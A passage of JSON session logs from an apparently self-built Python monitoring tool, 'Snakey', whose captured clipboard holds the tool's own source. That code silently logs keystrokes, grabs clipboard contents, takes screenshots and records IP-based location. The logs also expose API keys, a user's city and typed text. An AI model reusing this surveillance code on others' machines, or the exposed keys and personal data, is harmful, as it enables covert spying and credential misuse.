hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData_Roaming\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"AppData_Local\": os.environ.get(\"LOCALAPPDATA\", \"\"),\r\n        \"Temp\": os.environ.get(\"TEMP\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                # Get the number of files and folders directly inside this directory\r\n                item_count = 0\r\n                for item in os.listdir(path):\r\n                    if os.path.isfile(os.path.join(path, item)) or os.path.isdir(os.path.join(path, item)):\r\n                        item_count += 1\r\n                dir_status[name] = f\"Found ({item_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef scan_with_yara():\r\n    findings = []\r\n    try:\r\n        if not os.path.exists(yara_rules_path):\r\n            print(f\"[ERROR] YARA rules file not found at: {yara_rules_path}\")\r\n            return findings\r\n\r\n        rules = yara.compile(filepath=yara_rules_path)\r\n        print(f\"[INFO] Starting YARA scan of {len(yara_scan_dirs)} essential directories.\")\r\n\r\n        # Define a list of file extensions that YARA can typically scan\r\n        # This includes executables, libraries, script files, and common archive/text formats.\r\n        # Add or remove extensions based on what types of malware you want to detect.\r\n        SCAN_EXTENSIONS = (\r\n            '.exe', '.dll', '.sys', '.ps1', '.vbs', '.js', '.bat', '.cmd', '.scr', '.hta',\r\n            '.jar', '.py', '.pyc', '.bin', '.dat', # Common binary/data files\r\n            '.zip', '.rar', '.7z', '.iso', # Archives (YARA can sometimes scan inside them, or the archive itself)\r\n            '.txt', '.log', '.ini', '.conf', '.json', '.xml', # Text-based config/log files\r\n            # DO NOT include document types like .docx, .pdf, .xlsx, .jpg, .png, .mp3, .mp4\r\n        )\r\n\r\n        for scan_dir in yara_scan_dirs:\r\n            if not os.path.isdir(scan_dir):\r\n                print(f\"[WARNING] YARA scan directory '{scan_dir}' does not exist, skipping.\")\r\n                continue\r\n\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n\r\n                    # --- ADD THIS EXTENSION CHECK ---\r\n                    if not file_path.lower().endswith(SCAN_EXTENSIONS):\r\n                        # print(f\"[DEBUG] Skipping non-scanable file type: {file_path}\") # Uncomment for debugging\r\n                        continue\r\n                    # --- END EXTENSION CHECK ---\r\n\r\n                    try:\r\n                        # Add a basic file size check to avoid scanning extremely large files\r\n                        # (e.g., limit to 50MB for most malware samples)\r\n                        if os.path.getsize(file_path) > 50 * 1024 * 1024: # 50 MB\r\n                            # print(f\"[DEBUG] Skipping large file: {file_path}\") # Uncomment for debugging\r\n                            continue\r\n\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except yara.Error as ye:\r\n                        if \"too many matches\" in str(ye).lower():\r\n                            print(f\"[WARNING] YARA: Too many matches for a string in rule(s) for file: {file_path}. Rule(s) might be too broad. Error: {ye}\")\r\n                        else:\r\n                            print(f\"[ERROR] YARA scanning error for {file_path}: {ye}\")\r\n                        continue\r\n                    except Exception as e:\r\n                        # Catch other file-related errors (e.g., permission denied, file in use)\r\n                        print(f\"[WARNING] Could not scan file {file_path} due to OS error: {e}\")\r\n                        continue\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan initialization failed: {e}\"})\r\n    return findings\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {},\r\n        \"yara_findings\": []\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n\r\n        addr_info = socket.getaddrinfo(hostname, None)\r\n        ipv4s = list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n        ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n        session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n        session_log[\"system\"][\"ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    session_log[\"yara_findings\"] = scan_with_yara()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash = hash_text(session_log[\"log_hash\"] + previous_hash)\r\n\r\n        ledger.append({\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        })\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        merkle_root = build_merkle_tree([entry[\"log_hash\"] for entry in ledger])\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")", "keystrokes": "i initiad[BACKSPACE][BACKSPACE]ated snakey but its not showing on task manage", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (811 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4bff72435cd7455a8ddfaa2e3f10163868ccfc2df0f81d04652c523273584350", "screenshot_hash": "428b7bbe804e371be3755413e1b57b00b1ea9d82a5d0ffa381c613360438a2c3", "_raw_log_hash": "f5beaeea5144ec1a7f1b6e53436da4514886ebbbd63c2ff681d572f676cef0e8"}
{"timestamp": "2025-06-20T23:21:31.112600+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport yara\r\nfrom datetime import datetime\r\nfrom requests import get, post # Keep requests here\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Ensure requests is imported early\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\" # Your VirusTotal API Key\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40\" # Your AbuseIPDB API Key\r\n\r\n# YARA Configuration\r\nyara_rules_path = os.path.join(\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\", \"malware_index.yar\")\r\n\r\n# --- MODIFICATION START ---\r\n# Define the essential directories to scan for malware.\r\n# These are common locations where malware often resides or drops files.\r\n# Avoid scanning entire system drives (like C:/Windows, C:/Program Files)\r\n# as they contain millions of legitimate files that can trigger generic rules.\r\n\r\n# Get common user-specific paths\r\nuser_home = os.path.expanduser(\"~\")\r\nappdata_local = os.environ.get(\"LOCALAPPDATA\")\r\nappdata_roaming = os.environ.get(\"APPDATA\")\r\ntemp_dir = os.environ.get(\"TEMP\") or os.environ.get(\"TMP\") # Gets the primary temp dir\r\n\r\n# List of essential directories to scan.\r\n# We'll use os.path.normpath to ensure consistent path separators.\r\nyara_scan_dirs = [\r\n    os.path.normpath(os.path.join(user_home, \"Desktop\")),\r\n    os.path.normpath(os.path.join(user_home, \"Downloads\")),\r\n    os.path.normpath(os.path.join(user_home, \"Documents\")),\r\n    os.path.normpath(os.path.join(user_home, \"Pictures\")), # Sometimes malware drops here\r\n]\r\n\r\n# Add AppData and Temp directories if they exist\r\nif appdata_local:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local, \"Temp\"))) # Local AppData Temp\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local))) # General Local AppData\r\nif appdata_roaming:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming))) # General AppData Roaming\r\nif temp_dir:\r\n    yara_scan_dirs.append(os.path.normpath(temp_dir)) # Main system temp dir\r\n\r\n# Add common persistence locations (Windows specific)\r\n# Use os.getenv for environment variables like PROGRAMDATA\r\nprogram_data = os.getenv('PROGRAMDATA') # C:\\ProgramData\r\nif program_data:\r\n    yara_scan_dirs.append(os.path.normpath(program_data))\r\n    # Common Startup folders (malware often uses these for persistence)\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(program_data, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n\r\n# Filter out any non-existent directories from the list to avoid errors\r\nyara_scan_dirs = [d for d in yara_scan_dirs if os.path.isdir(d)]\r\n\r\nprint(f\"[INFO] YARA will scan the following directories: {yara_scan_dirs}\")\r\n# --- MODIFICATION END ---\r\n\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData_Roaming\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"AppData_Local\": os.environ.get(\"LOCALAPPDATA\", \"\"),\r\n        \"Temp\": os.environ.get(\"TEMP\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                # Get the number of files and folders directly inside this directory\r\n                item_count = 0\r\n                for item in os.listdir(path):\r\n                    if os.path.isfile(os.path.join(path, item)) or os.path.isdir(os.path.join(path, item)):\r\n                        item_count += 1\r\n                dir_status[name] = f\"Found ({item_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef scan_with_yara():\r\n    findings = []\r\n    try:\r\n        if not os.path.exists(yara_rules_path):\r\n            print(f\"[ERROR] YARA rules file not found at: {yara_rules_path}\")\r\n            return findings\r\n\r\n        rules = yara.compile(filepath=yara_rules_path)\r\n        print(f\"[INFO] Starting YARA scan of {len(yara_scan_dirs)} essential directories.\")\r\n\r\n        # Define a list of file extensions that YARA can typically scan\r\n        # This includes executables, libraries, script files, and common archive/text formats.\r\n        # Add or remove extensions based on what types of malware you want to detect.\r\n        SCAN_EXTENSIONS = (\r\n            '.exe', '.dll', '.sys', '.ps1', '.vbs', '.js', '.bat', '.cmd', '.scr', '.hta',\r\n            '.jar', '.py', '.pyc', '.bin', '.dat', # Common binary/data files\r\n            '.zip', '.rar', '.7z', '.iso', # Archives (YARA can sometimes scan inside them, or the archive itself)\r\n            '.txt', '.log', '.ini', '.conf', '.json', '.xml', # Text-based config/log files\r\n            # DO NOT include document types like .docx, .pdf, .xlsx, .jpg, .png, .mp3, .mp4\r\n        )\r\n\r\n        for scan_dir in yara_scan_dirs:\r\n            if not os.path.isdir(scan_dir):\r\n                print(f\"[WARNING] YARA scan directory '{scan_dir}' does not exist, skipping.\")\r\n                continue\r\n\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n\r\n                    # --- ADD THIS EXTENSION CHECK ---\r\n                    if not file_path.lower().endswith(SCAN_EXTENSIONS):\r\n                        # print(f\"[DEBUG] Skipping non-scanable file type: {file_path}\") # Uncomment for debugging\r\n                        continue\r\n                    # --- END EXTENSION CHECK ---\r\n\r\n                    try:\r\n                        # Add a basic file size check to avoid scanning extremely large files\r\n                        # (e.g., limit to 50MB for most malware samples)\r\n                        if os.path.getsize(file_path) > 50 * 1024 * 1024: # 50 MB\r\n                            # print(f\"[DEBUG] Skipping large file: {file_path}\") # Uncomment for debugging\r\n                            continue\r\n\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except yara.Error as ye:\r\n                        if \"too many matches\" in str(ye).lower():\r\n                            print(f\"[WARNING] YARA: Too many matches for a string in rule(s) for file: {file_path}. Rule(s) might be too broad. Error: {ye}\")\r\n                        else:\r\n                            print(f\"[ERROR] YARA scanning error for {file_path}: {ye}\")\r\n                        continue\r\n                    except Exception as e:\r\n                        # Catch other file-related errors (e.g., permission denied, file in use)\r\n                        print(f\"[WARNING] Could not scan file {file_path} due to OS error: {e}\")\r\n                        continue\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan initialization failed: {e}\"})\r\n    return findings\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {},\r\n        \"yara_findings\": []\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n\r\n        addr_info = socket.getaddrinfo(hostname, None)\r\n        ipv4s = list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n        ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n        session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n        session_log[\"system\"][\"ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    session_log[\"yara_findings\"] = scan_with_yara()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash = hash_text(session_log[\"log_hash\"] + previous_hash)\r\n\r\n        ledger.append({\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        })\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        merkle_root = 